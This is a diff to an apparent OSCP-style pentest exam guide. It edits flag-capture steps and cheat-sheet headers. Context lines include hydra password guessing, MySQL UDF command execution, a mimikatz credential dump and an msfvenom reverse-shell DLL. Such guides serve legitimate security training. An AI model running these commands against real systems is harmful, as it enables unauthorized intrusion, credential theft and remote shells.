@@ -465,7 +465,7 @@ If none of those changed for 20–30 minutes, you are probably repeating a hypot
 
 Do this **before another exploit, a shell exit, a revert, or a break** whenever you obtain `local.txt` or `proof.txt`:
 
-1. Stay in an **interactive shell** on the target. PowerShell Core / PSSession counts as an interactive shell under the current FAQ.
+1. Stay in an **interactive shell** on the target. If banking `proof.txt`, verify the current context is privileged **before capture**: `id -u` must show `0` / root on Linux; on Windows, `whoami /all` must establish SYSTEM, Administrator, or a user with Administrator privileges. `local.txt` may be obtained from an unprivileged account. PowerShell Core / PSSession counts as an interactive shell under the current FAQ.
 2. Read the flag with `cat` or `type` from its **original absolute path**. Do not use a web shell, file download, or copied flag file as proof.
 3. In the same terminal view, run `ip addr`, `ifconfig`, or `ipconfig`; keep the target IP and full flag contents visible together in one readable screenshot. `hostname` and `id` / `whoami` are useful context, but the official required pair is **target IP + flag contents**.
 4. Submit the exact value in the exam control panel **before the attack window ends**. The panel does not confirm whether the value is correct, so compare it yourself.
@@ -473,8 +473,8 @@ Do this **before another exploit, a shell exit, a revert, or a break** whenever 
 6. Mark the evidence gate complete and write the next action. If fatigue is rising, take a 5–10 minute break **now, after closure—not before it**. Then re-enumerate only if the new identity changes the attack surface; otherwise rotate.
 
 ```text
-SHELL → ORIGINAL PATH → IP + FLAG IN ONE SCREENSHOT → CONTROL PANEL
-      → COMMANDS + CHANGES + SCREENSHOT NAME → ONLY THEN MOVE
+SHELL → VERIFY PRIVILEGE IF proof.txt → ORIGINAL PATH → IP + FLAG IN ONE SCREENSHOT
+      → CONTROL PANEL → COMMANDS + CHANGES + SCREENSHOT NAME → ONLY THEN MOVE
 ```
 
 **If you believe you have 70+ points:** pause new exploitation and audit every counted target first. Unsubmitted or invalid evidence is not safely banked.
@@ -1295,7 +1295,7 @@ ftp> mget *              # Get all files
 ftp> put shell.php       # Upload if writable!
 ftp> passive             # Toggle passive mode if connection issues
 
-# ── RECURSIVE DOWNLOAD ────────────────────────────────────────
+# ── RECURSIVE DOWNLOAD ALL ────────────────────────────────────
 wget -m --no-passive ftp://anonymous:anonymous@$IP
 wget -m ftp://user:pass@$IP
 # List the root directory without embedding credentials in shell history:
@@ -1976,7 +1976,7 @@ select do_system('id > /tmp/out; chown user /tmp/out');
 # ── ONLINE GUESSING — LAST RESORT ─────────────────────────────
 # Confirm scope + lockout policy; use only a small, evidence-derived shortlist.
 SHORTLIST=notes/password-shortlist.txt
-test -s "$SHORTLIST" && hydra -l root -P "$SHORTLIST" $IP mysql -t 2
+test -s "$SHORTLIST" && hydra -l root -P "$SHORTLIST" $IP mysql -t 1
 
 # ── NMAP SCRIPTS ──────────────────────────────────────────────
 nmap --script mysql-info,mysql-databases,mysql-users,mysql-empty-password -p3306 $IP
@@ -2333,7 +2333,7 @@ telnet $IP 23
 # Test only a justified default/known credential manually; do not spray by default.
 nmap -Pn -n -sV --script telnet-encryption -p23 $IP
 
-# ── POP3 (110) ───────────────────────────────────────────────
+# ── POP3 (110) ────────────────────────────────────────────────
 nc -nv $IP 110
 USER admin
 PASS password
@@ -2450,7 +2450,7 @@ i686-w64-mingw32-gcc exploit.c -o exploit.exe          # 32-bit Windows
 x86_64-w64-mingw32-gcc exploit.c -o exploit64.exe      # 64-bit Windows
 i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32 # With winsock
 
-# ── EXPLOIT MODIFICATION CHECKLIST ───────────────────────────
+# ── EXPLOIT MODIFICATION CHECKLIST ────────────────────────────
 # Before running ANY exploit:
 # 1. Read the code — understand what it does
 # 2. Check: does it need a listener? what port?
@@ -7211,7 +7211,7 @@ sekurlsa::logonpasswords
 # Use Procmon on Windows: filter Result=NAME NOT FOUND + .dll in path
 # Or use winpeas output which lists writable directories in PATH
 
-# ── CREATE MALICIOUS DLL ─────────────────────────────────────
+# ── CREATE MALICIOUS DLL ──────────────────────────────────────
 msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f dll -o missing.dll
 
 # C template (more reliable):
